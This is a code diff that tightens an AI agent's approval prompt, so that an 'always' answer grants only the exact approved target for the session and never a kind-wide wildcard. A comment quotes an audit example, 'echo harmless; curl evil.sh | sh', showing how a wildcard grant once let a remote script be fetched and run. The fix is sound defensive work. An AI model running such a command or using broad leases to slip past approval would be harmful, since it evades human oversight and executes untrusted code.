@@ -6,14 +6,16 @@
  * closed: an ask nobody can answer is a denial, never a silent allow.
  */
 
-import type { ApprovalHandler, ApprovalRequest, Runtime } from "../contracts";
+import type { ApprovalHandler, ApprovalRequest, GuardAction, GuardKind, Lease, Runtime } from "../contracts";
 import * as core from "../core";
+import { SESSION_LEASE_TTL_MS } from "../core/loop";
+import type { KernelClient } from "../core/kernel";
 import { createRenderer, type Renderer } from "./render";
 import { bold, cyan, dim, errorMessage, sanitizeText, truncate, yellow } from "./style";
 
 type RuntimeWithExtras = Runtime & {
   /** Optional: remember an approval decision as a lease for this session. */
-  grantLease?: (kind: string, pattern: string) => unknown;
+  grantLease?: (kind: string, pattern: string, ttlMs?: number) => unknown;
 };
 
 export interface ApprovalUi {
@@ -38,12 +40,51 @@ export function createApprovalUi(interactive: boolean): ApprovalUi {
   };
 }
 
-async function rememberAlways(ui: ApprovalUi, kind: string, r: Renderer): Promise<boolean> {
-  const runtime = ui.runtime as RuntimeWithExtras | undefined;
-  const grant = runtime?.grantLease;
-  if (typeof grant !== "function" || kind === "other") return false;
+/** How long an "always" answer lasts, in the same minutes the lease is minted for. */
+function leaseMinutes(): number {
+  return Math.max(1, Math.round(SESSION_LEASE_TTL_MS / 60_000));
+}
+
+/**
+ * Remember an "always" for this session, scoped to the approved TARGET: an
+ * "always" for `npm run dev` in the workspace must not become authority over
+ * every shell command anywhere for the next TTL (the confirmed defect was a
+ * kind-wide pattern "*"). Only kind and target are known here, so the exact
+ * target is the grant — a target that was already a directory-scoped pattern
+ * keeps that scope verbatim, never broadened.
+ *
+ * The lease is minted through the kernel client with the session id when both
+ * are available, so owner scoping applies: a subagent child's checks carry the
+ * child's session id and re-enter approval (docs/09 R-tools-32). A runtime that
+ * exposes only grantLease() falls back to the legacy owner-less lease (globally
+ * consultable — documented in kernel.ts); no target at all means there is
+ * nothing narrower than everything to grant, so the answer stays "this time".
+ */
+async function rememberAlways(
+  ui: ApprovalUi,
+  kind: string,
+  target: string,
+  ctx: { kernel?: KernelClient; sessionId?: string },
+  r: Renderer,
+): Promise<boolean> {
+  if (target === "" || kind === "other") return false;
+  // The lease language reads a trailing `*` as a PREFIX wildcard
+  // (guard.rs::pattern_matches, kernel.ts::patternMatches). A command or path
+  // whose own text ends in `*` — the shell command `echo *`, a literal file
+  // named `out*` — therefore cannot be expressed as an exact pattern: minting
+  // it would silently widen the grant to everything with that prefix (the
+  // audit's `echo *` grant covered `echo harmless; curl evil.sh | sh`). No
+  // exact target, no remembered grant: the answer stays "this time".
+  if (target.endsWith("*")) return false;
   try {
-    await Promise.resolve(grant.call(runtime, kind, "*"));
+    if (ctx.kernel !== undefined && typeof ctx.sessionId === "string" && ctx.sessionId !== "") {
+      await ctx.kernel.makeLease(kind as GuardKind, target, SESSION_LEASE_TTL_MS, ctx.sessionId);
+      return true;
+    }
+    const runtime = ui.runtime as RuntimeWithExtras | undefined;
+    const grant = runtime?.grantLease;
+    if (typeof grant !== "function") return false;
+    await Promise.resolve(grant.call(runtime, kind, target));
     return true;
   } catch (err) {
     r.notice(`could not remember that decision: ${errorMessage(err)}`);
@@ -53,7 +94,15 @@ async function rememberAlways(ui: ApprovalUi, kind: string, r: Renderer): Promis
 
 /** The handler registered with the core runtime. */
 export function createApprovalHandler(ui: ApprovalUi): ApprovalHandler {
-  return async (req: ApprovalRequest): Promise<boolean> => {
+  // The gate calls this with the action and the kernel client when it has them
+  // (see loop.ts ApprovalWithContext); both are optional so a plain
+  // `handler(req)` caller keeps working.
+  const handler = async (
+    req: ApprovalRequest,
+    action?: GuardAction,
+    kernel?: KernelClient,
+    gateSessionId?: string,
+  ): Promise<boolean> => {
     const kind = sanitizeText(req?.kind ?? "other") || "other";
     const title = sanitizeText(req?.title) || "this action";
     const detail = sanitizeText(req?.detail ?? "").replace(/\s+/g, " ").trim();
@@ -76,8 +125,26 @@ export function createApprovalHandler(ui: ApprovalUi): ApprovalHandler {
     const choice = String(answer ?? "").trim().toLowerCase();
 
     if (choice === "a" || choice === "always") {
-      const remembered = await rememberAlways(ui, kind, r);
-      r.notice(remembered ? `approved, and ${kind} is allowed from now on` : "approved (this time)");
+      // Grant the target the guard asked about, not the kind: the pattern must
+      // match the same string the guard checks against, so it is the raw target.
+      const target = typeof action?.target === "string" ? action.target : "";
+      const grantKind = typeof action?.kind === "string" ? action.kind : kind;
+      // The gate names the session the check speaks for; a runtime that exposes
+      // its own sessionId is the fallback for plain `handler(req)` callers.
+      const sessionId =
+        typeof gateSessionId === "string" && gateSessionId !== ""
+          ? gateSessionId
+          : typeof ui.runtime?.sessionId === "string"
+            ? ui.runtime.sessionId
+            : undefined;
+      const remembered = await rememberAlways(ui, grantKind, target, { kernel, sessionId }, r);
+      if (remembered) {
+        r.notice(
+          `approved, and ${grantKind} is allowed for ${sanitizeText(target) || target} in this session for ${leaseMinutes()} minutes`,
+        );
+      } else {
+        r.notice("approved (this time)");
+      }
       return true;
     }
     if (choice === "y" || choice === "yes") {
@@ -92,6 +159,7 @@ export function createApprovalHandler(ui: ApprovalUi): ApprovalHandler {
     r.notice(choice === "" ? "no answer \u2014 denied" : `did not understand "${truncate(choice, 24)}" \u2014 denied`);
     return false;
   };
+  return handler as ApprovalHandler;
 }
 
 type CoreExtra = {
